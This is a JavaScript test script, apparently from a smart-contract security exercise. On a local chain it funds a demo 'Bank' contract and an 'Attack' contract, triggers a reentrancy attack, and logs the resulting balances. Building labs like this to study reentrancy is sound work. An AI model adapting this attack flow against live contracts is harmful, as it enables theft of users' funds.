const Web3 = require('web3');
const { CurrentConfig } = require( '../config/rpc');
const BankABI = require('../artifacts/contracts/reentrancy_attack/Bank.sol/Bank.json').abi;
const AttackABI = require('../artifacts/contracts/reentrancy_attack/Attack.sol/Attack.json').abi;
const {privateKey, aTestPrivateKey, bTestPrivateKey , acc0} = require('../secrets.json');
const {estimateGas, etherToWei, getGasPrice} = require('../utils/utils');


describe("reentrancy", function () {
    let web3, bankAddress, bankContract, attackAddress, attackContract;

    before("", async function () {
         // web3 = new Web3(CurrentConfig.rpc.polygonMumbai);
         web3 = new Web3(CurrentConfig.rpc.local);
         bankAddress = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
         bankContract = new web3.eth.Contract(BankABI, bankAddress);
         attackAddress = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512";
         attackContract = new web3.eth.Contract(AttackABI, attackAddress);
         console.log("before");
    });

    it("other deposit", async function () {
        const acc = web3.eth.accounts.privateKeyToAccount(acc0.privateKey);
        web3.eth.accounts.wallet.add(acc);
        //deposite
        const depositAmount = web3.utils.toWei("1", "ether");
        const data = await bankContract.methods.deposit().encodeABI();
        console.log("data", data);
        console.log("acc.address", acc.address);
        const gasArgs = await estimateGas(web3, acc0.account, bankAddress, data, depositAmount);
        console.log("gasArgs", gasArgs);
        const tx = await web3.eth.sendTransaction({
            from: acc0.account,
            to: bankAddress,
            data: data,
            gas: gasArgs.gas,
            gasPrice: gasArgs.gasPrice,
            value: depositAmount
        });
        console.log("tx", tx);
    }).timeout('100000');

    it("transfer to attacker", async function () {
        const acc = web3.eth.accounts.privateKeyToAccount(acc0.privateKey);
        web3.eth.accounts.wallet.add(acc);
        //
        const amount = web3.utils.toWei("0.8", "ether");
        console.log("acc.address", acc.address);
        const data = await attackContract.methods.initAmount().encodeABI();
        console.log("data", data);
        const gasArgs = await estimateGas(web3, acc0.account, attackAddress, data, amount);
        console.log("gasArgs", gasArgs);
        const tx = await web3.eth.sendTransaction({
            from: acc0.account,
            to: attackAddress,
            data: data,
            gas: gasArgs.gas,
            gasPrice: gasArgs.gasPrice,
            value: amount
        });
        console.log("tx", tx);
    }).timeout('100000');

    it("do attack", async function () {
        const acc = web3.eth.accounts.privateKeyToAccount(acc0.privateKey);
        web3.eth.accounts.wallet.add(acc);
        const data = await attackContract.methods.attack().encodeABI();
        const amount = web3.utils.toWei("2", "ether");
        const gasPrice = await getGasPrice(web3);
        const tx = await web3.eth.sendTransaction({
            from: acc0.account,
            to: attackAddress,
            data: data,
            value: amount,
            gas: 21000 * 10,
            gasPrice: gasPrice,
        });
        console.log("tx", tx);

    }).timeout('100000');

    it("get result", async function () {
        const res0 = await bankContract.methods.getBalance().call();
        console.log("res0", web3.utils.fromWei(res0));
        const res1 = await web3.eth.getBalance(attackAddress);
        console.log("res1", web3.utils.fromWei(res1));
        const res2 = await web3.eth.getBalance(acc0.account);
        console.log("res2", web3.utils.fromWei(res2));
        const res3 = await bankContract.methods.getBalanceWithAddress(attackAddress).call();
        console.log("res3", web3.utils.fromWei(res3));
    }).timeout('100000');

});